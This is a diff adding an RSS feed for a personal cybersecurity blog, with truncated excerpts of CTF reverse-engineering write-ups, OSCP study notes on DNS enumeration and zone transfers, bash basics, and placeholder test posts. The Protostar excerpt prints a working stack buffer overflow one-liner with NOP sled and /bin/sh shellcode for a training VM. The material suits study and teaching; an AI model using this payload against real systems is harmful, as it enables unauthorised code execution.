@@ -1,0 +1,175 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>B0YK4</title>
+    <link>https://b0yk4.github.io/</link>
+    <description>Recent content on B0YK4</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Mon, 23 Aug 2021 16:26:40 +0200</lastBuildDate>
+    
+	<atom:link href="https://b0yk4.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Android101</title>
+      <link>https://b0yk4.github.io/posts/cybertalents/rverse/android101/</link>
+      <pubDate>Mon, 23 Aug 2021 16:26:40 +0200</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/cybertalents/rverse/android101/</guid>
+      <description>Category: Malware Reverse Engineering Level: medium Points: 100
+challenge: android101
+$ d2j-dex2jar -f android101.apk by opening the jar file with JD-GUI
+validate() function in MainActivity:
+String Validate(String paramString) { StringBuilder stringBuilder = new StringBuilder(paramString); for (byte b = 0; b &amp;lt; stringBuilder.length(); b++) { for (byte b1 = b; b1 &amp;lt; stringBuilder.length() - 1; b1++) { char c = stringBuilder.charAt(b1); stringBuilder.setCharAt(b1, stringBuilder.charAt(b1 + 1)); stringBuilder.setCharAt(b1 + 1, c); } } if (stringBuilder.</description>
+    </item>
+    
+    <item>
+      <title>Basic bash commands</title>
+      <link>https://b0yk4.github.io/posts/oscp/bash_basics/</link>
+      <pubDate>Mon, 23 Aug 2021 14:53:32 +0200</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/oscp/bash_basics/</guid>
+      <description>#### commands info man ls # manual and all &amp;#34;ls&amp;#34; info whatis ls # quit description for what is ls apropos list # search what tool to do this function whoami sudo adduser mohamed # add user usermod -aG sudo mohamed # add sudo user shasum file # see file hashing ### file mangement 1-ordinary files 2- special files 3-directories pwd # current directory ls # list ls -l # with all informations ll ls -il ls -a # with all hidden files ls -i # inode number of files (index of file) find /home/boyka -inum 1150561 #find file with inode number ### creating files cat&amp;gt;file_name # Create a file and enter data and ctrl+D to save the file cat file_name # display the file data touch file_name2 # create and save empty file ### move - rename - copy - delete mv file_name file_name_new	# rename a file or move the file mv file_name /home/boyka/Desktop mv * /home/boyka/Desktop # use regex to selet more than file to move mv f* /home/boyka/Desktop mv /home/boyka/Desktop/file_name .</description>
+    </item>
+    
+    <item>
+      <title>OSCP active info gathering</title>
+      <link>https://b0yk4.github.io/posts/oscp/mod7-active_info/</link>
+      <pubDate>Mon, 23 Aug 2021 14:53:32 +0200</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/oscp/mod7-active_info/</guid>
+      <description>DNS enumeration ip look up
+$ host -t A dns.google #lookup $ host -t PTR 8.8.8.8 #reverse lookup host records more than 30 record A-PTR-CNAME-MX(domain that handel the server)-ns.. all text data needed for bruteforce seclists, installed in linux and used with commands or we can use the data from github
+$ seclists zone transfers to get more info about target domains and the internal network
+$ host -l &amp;lt;domain&amp;gt; &amp;lt;dns server address&amp;gt; to get dns servers addresses and try bruteforce the domain named if you got no ns records with (-t ns)</description>
+    </item>
+    
+    <item>
+      <title>OSCP bash module</title>
+      <link>https://b0yk4.github.io/posts/oscp/oscp_bash/</link>
+      <pubDate>Mon, 23 Aug 2021 14:53:32 +0200</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/oscp/oscp_bash/</guid>
+      <description>#### commands info man ls # manual and all &amp;#34;ls&amp;#34; info whatis ls # quit description for what is ls apropos list # search what tool to do this function whoami sudo adduser mohamed # add user usermod -aG sudo mohamed # add sudo user shasum file # see file hashing pkg -i &amp;#39;***&amp;#39; # install package apt remove &amp;#39;pkg&amp;#39;	# remove programe package apt remove --purge &amp;#39;pkg&amp;#39; # remove package configiration # search locate rockyou.</description>
+    </item>
+    
+    <item>
+      <title>Protostar machine</title>
+      <link>https://b0yk4.github.io/posts/protostar/protostar/</link>
+      <pubDate>Mon, 23 Aug 2021 14:53:32 +0200</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/protostar/protostar/</guid>
+      <description>Stack 5 int main(int argc, char **argv) { char buffer[64]; gets(buffer); } just direct BOF we will overwite the return address of the main with the address of the beginning of our evel code which begins with nope slids and then the shellcode
+ the reason of using cat to serve our shell with stdi/o
+ $ (python -c &amp;#39;import struct; BOF = 76*&amp;#34;A&amp;#34;; jmpaddr=struct.pack(&amp;#34;I&amp;#34;,0xbffff7f0); nope = 100*&amp;#34;\x90&amp;#34;; shell =&amp;#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&amp;#34;; print BOF+jmpaddr+nope+shell&amp;#39;; cat) | .</description>
+    </item>
+    
+    <item>
+      <title>Rokai challange</title>
+      <link>https://b0yk4.github.io/posts/cybertalents/rokai/</link>
+      <pubDate>Mon, 23 Aug 2021 14:53:32 +0200</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/cybertalents/rokai/</guid>
+      <description>Category: Malware Reverse Engineering Level: medium Points: 100
+apk: If you don&amp;rsquo;t like the road you&amp;rsquo;re walking, start paving another one.
+ first of all the discription indicates us that there is something missing and needs to provided, let&amp;rsquo;s see what that thing is.
+there are more than one way for the solution i&amp;rsquo;ll explain the way i used.
+ tools:
+ dex2jar JD-GUI apk studio android studio  i tried to reverse the app firt from the smali output that i get from apktool but it not the better way for a noob like me.</description>
+    </item>
+    
+    <item>
+      <title>Test 9</title>
+      <link>https://b0yk4.github.io/posts/test-9/</link>
+      <pubDate>Thu, 09 Jan 1012 00:00:00 +0000</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/test-9/</guid>
+      <description>Test 9</description>
+    </item>
+    
+    <item>
+      <title>Test 8</title>
+      <link>https://b0yk4.github.io/posts/test-8/</link>
+      <pubDate>Wed, 08 Jan 1012 00:00:00 +0000</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/test-8/</guid>
+      <description>Test 8</description>
+    </item>
+    
+    <item>
+      <title>Test 7</title>
+      <link>https://b0yk4.github.io/posts/test-7/</link>
+      <pubDate>Tue, 07 Jan 1012 00:00:00 +0000</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/test-7/</guid>
+      <description>Test 7</description>
+    </item>
+    
+    <item>
+      <title>Test 6</title>
+      <link>https://b0yk4.github.io/posts/test-6/</link>
+      <pubDate>Mon, 06 Jan 1012 00:00:00 +0000</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/test-6/</guid>
+      <description>Test 6</description>
+    </item>
+    
+    <item>
+      <title>Test 5</title>
+      <link>https://b0yk4.github.io/posts/test-5/</link>
+      <pubDate>Sun, 05 Jan 1012 00:00:00 +0000</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/test-5/</guid>
+      <description>Test 5</description>
+    </item>
+    
+    <item>
+      <title>Test 4</title>
+      <link>https://b0yk4.github.io/posts/test-4/</link>
+      <pubDate>Sat, 04 Jan 1012 00:00:00 +0000</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/test-4/</guid>
+      <description>Test 4</description>
+    </item>
+    
+    <item>
+      <title>Test 3</title>
+      <link>https://b0yk4.github.io/posts/test-3/</link>
+      <pubDate>Fri, 03 Jan 1012 00:00:00 +0000</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/test-3/</guid>
+      <description>Test 3</description>
+    </item>
+    
+    <item>
+      <title>Test 2</title>
+      <link>https://b0yk4.github.io/posts/test-2/</link>
+      <pubDate>Thu, 02 Jan 1012 00:00:00 +0000</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/test-2/</guid>
+      <description>Test 2</description>
+    </item>
+    
+    <item>
+      <title>Test 1</title>
+      <link>https://b0yk4.github.io/posts/test-1/</link>
+      <pubDate>Wed, 01 Jan 1012 00:00:00 +0000</pubDate>
+      
+      <guid>https://b0yk4.github.io/posts/test-1/</guid>
+      <description>Test 1 I am referencing a footnote1
+1package main 2 3import &amp;#34;fmt&amp;#34; 4 5func main() { 6 fmt.Println(&amp;#34;{linenos=inline}&amp;#34;) 7} 1 2 3 4 5 6 7  package main import &amp;#34;fmt&amp;#34; func main() { fmt.Println(&amp;#34;{linenos=table}&amp;#34;) }   Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis in dictum tortor. Morbi laoreet enim id sem euismod lobortis. Donec quam libero, bibendum non cursus vitae, dictum vel eros.   I am the footnote &amp;#x21a9;&amp;#xfe0e;</description>
+    </item>
+    
+    <item>
+      <title>About</title>
+      <link>https://b0yk4.github.io/about/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://b0yk4.github.io/about/</guid>
+      <description>hello there!
+this my lil blog to improve my writing skills and keep writing down the things i know. all topics related to cyber security:
+ Challenges writeups Courses|books notes tools techniques explanation and more  if you have any suggestion for making this blog better or any edit please contact me i&amp;rsquo;d like to take the feedback.</description>
+    </item>
+    
+  </channel>
+</rss>
